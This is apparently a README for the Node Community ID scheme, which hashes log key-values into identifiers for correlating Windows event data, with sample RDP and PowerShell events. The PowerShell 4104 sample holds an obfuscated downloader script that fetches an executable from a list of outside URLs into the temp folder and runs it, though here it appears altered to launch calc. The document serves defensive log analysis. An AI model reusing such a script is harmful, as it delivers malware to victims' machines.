# Node Community ID

In local host monitoring, a lot of data points cannot be shared and used to compare with other data points.
When collecting large dataset and building graph, it's becoming a tedious task to find pivot or correlating
points. There are many application, system (e.g. sysmon, proprietary EDR) which are logging in different
format. The node community ID is providing a unique identifier to quickly find pivot points or correlating
values in large dataset. The node community ID is simple hashing describing the type of hashed values and
the xxhash of the concatenated values. The node community ID (NCID) can used as graph node.

# Format

`NCID-<TYPE>-<XXHASH>`

# NCID Type

|Value|Description                        |Example             |
|:---:|:---------------------------------:|:------------------:|
|1    |protocol:ip_dst:port               |udp:8.8.8.8:53      |
|2    |eventkey:value                     |MethodName:GetServerAutoReconnectInfo|
|3    |channel:eventkey:value             |Microsoft-Windows-PowerShell/Operational:ScriptBlockText:...:

# Sample EVT with interesting NCID

### NCID 2

The NCID is a generic community id which can use to map key:value for interesting common values without
knowing in advance the key.


```json
{
  "Provider_Name": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS",
  "Provider_Guid": "{1139c61b-b549-4251-8ed3-27250a1edec8}",
  "Provider": null,
  "EventID_Qualifiers": "",
  "EventID": "72",
  "Version": "0",
  "Level": "4",
  "Task": "4",
  "Opcode": "13",
  "Keywords": "0x4000000000000000",
  "TimeCreated_SystemTime": 1566996775,
  "TimeCreated": null,
  "EventRecordID": "1576",
  "Correlation_ActivityID": "{f4203a82-a3ed-4a64-86f8-cd9a9fba0000}",
  "Correlation_RelatedActivityID": "",
  "Correlation": null,
  "Execution_ProcessID": "396",
  "Execution_ThreadID": "3216",
  "Execution": null,
  "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
  "Computer": "MSEDGEWIN10",
  "Security_UserID": "S-1-5-20",
  "Security": null,
  "EventData_MethodName": "GetServerAutoReconnectInfo"
}
```

### NCID 3

```json
{
  "Provider_Name": "Microsoft-Windows-PowerShell",
  "Provider_Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
  "Provider": null,
  "EventID_Qualifiers": "",
  "EventID": "4104",
  "Version": "1",
  "Level": "5",
  "Task": "2",
  "Opcode": "15",
  "Keywords": "0x0000000000000000",
  "TimeCreated_SystemTime": 1598411368,
  "TimeCreated": null,
  "EventRecordID": "683",
  "Correlation_ActivityID": "{ccad9034-7b61-0001-83cf-adcc617bd601}",
  "Correlation_RelatedActivityID": "",
  "Correlation": null,
  "Execution_ProcessID": "6620",
  "Execution_ThreadID": "6340",
  "Execution": null,
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Computer": "DESKTOP-RIPCLIP",
  "Security_UserID": "S-1-5-21-2895499743-3664716236-3399808827-1001",
  "Security": null,
  "EventData_MessageNumber": "1",
  "EventData_MessageTotal": "1",
  "EventData_ScriptBlockText": "$Va5w3n8=(('Q'+'2h')+('w9p'+'1'));&('ne'+'w-'+'item') $eNV:teMP\\WOrd\\2019\\ -itemtype DIrectOry;[Net.ServicePointManager]::\"SecURi`T`ypRO`T`oCOL\" = ('t'+'ls'+'1'+('2, tl'+'s')+'11'+(', '+'tls'));$Depssu0 = (('D'+'yx')+('x'+'ur4g')+'x');$A74_j9r=('T'+'4'+('gf45'+'h'));$Fdkhtf_=$env:temp+(('{0}'+'word{'+'0}'+('2'+'01')+'9{0}') -F [CHAr]92)+$Depssu0+('.'+('ex'+'e'));$O39nj1p=('J6'+'9l'+('hm'+'h'));$Z8i525z=&('new-'+'obje'+'c'+'t') neT.WEbcLiENt;$Iwmfahs=(('h'+'ttp')+(':'+'//')+('q'+'u'+'anticaelectro'+'n'+'ic')+('s.com'+'/')+'w'+'p-'+'a'+('d'+'min')+'/'+'7A'+('Tr78'+'/*'+'htt')+('p'+'s:/')+('/r'+'e')+'be'+('l'+'co')+'m'+'.'+('ch/'+'pi'+'c')+('ture'+'_')+('l'+'ibra'+'ry/bbCt')+('l'+'S/')+('*ht'+'tp'+'s:/')+('/re'+'al')+'e'+'s'+('tate'+'a')+('gen'+'t')+'te'+('am.co'+'m')+'/'+('163/Q'+'T')+'d'+('/'+'*ht'+'tps:')+'//'+('w'+'ww.')+('ri'+'dd')+('hi'+'display.'+'c'+'o')+'m/'+'r'+'id'+'d'+('hi'+'/1pKY/'+'*htt')+'p'+(':'+'//')+('radi'+'osu'+'bmit.com/'+'sear')+('ch_'+'tes'+'t')+'/'+'p'+('/*'+'h')+('ttp'+':/')+'/'+('res'+'e')+'ar'+('ch'+'c')+'he'+'m'+('plu'+'s.'+'c')+('om/w'+'p-')+('a'+'dmin')+'/1'+('OC'+'C')+'/'+('*http:'+'/')+('/s'+'zymo')+('ns'+'zyp')+'er'+('sk'+'i')+('.'+'pl/a')+'ss'+('ets/'+'p')+'k/').\"S`Plit\"([char]42);$Zxnbryr=(('Dp'+'z9')+'4'+'a6');foreach($Mqku5a2 in $Iwmfahs){try{$Z8i525z.\"d`OWN`load`FIlE\"($Mqku5a2, $Fdkhtf_);$Lt8bjj7=('Ln'+('wp'+'ag')+'m');If ((.('Get-I'+'t'+'em') $Fdkhtf_).\"le`NgTH\" -ge 28315) {cp (gcm calc).path $Fdkhtf_ -Force; .('Invo'+'ke'+'-Item')($Fdkhtf_);$Nfgrgu9=(('Qj6'+'bs')+'x'+'n');break;$D7ypgo1=('Bv'+('e'+'bc')+'k0')}}catch{}}$Gmk6zmk=(('Z2x'+'aaj')+'0')",
  "EventData_ScriptBlockId": "fdd51159-9602-40cb-839d-c31039ebbc3a",
  "EventData_Path": null
}
```
